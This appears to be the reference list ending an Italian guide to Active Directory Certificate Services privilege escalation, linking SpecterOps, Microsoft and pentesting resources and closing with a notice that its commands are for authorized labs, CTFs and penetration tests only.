* [SpecterOps — Certify 2.0](https://specterops.io/blog/2025/08/11/certify-2-0/)
* [SpecterOps — Certify Command Overview](https://docs.specterops.io/ghostpack-docs/Certify.wik-mdx/1-command-overview)
* [SpecterOps — Certified Pre-Owned](https://specterops.io/blog/2021/06/17/certified-pre-owned/)
* [Microsoft — KB5014754 Strong Certificate Mapping](https://support.microsoft.com/en-us/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16)
* [Microsoft — Audit Certification Services](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/audit-certification-services)
* [HackTricks — AD CS Domain Escalation](https://hacktricks.wiki/en/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.html)
* [The Hacker Recipes — AD CS](https://www.thehacker.recipes/ad/movement/adcs/)
* [Hacking Articles — AD Certificate Exploitation ESC1](https://www.hackingarticles.in/ad-certificate-exploitation-esc1/)

> **Uso autorizzato:** i comandi di questa guida devono essere eseguiti esclusivamente in laboratori, CTF o penetration test con autorizzazione esplicita.
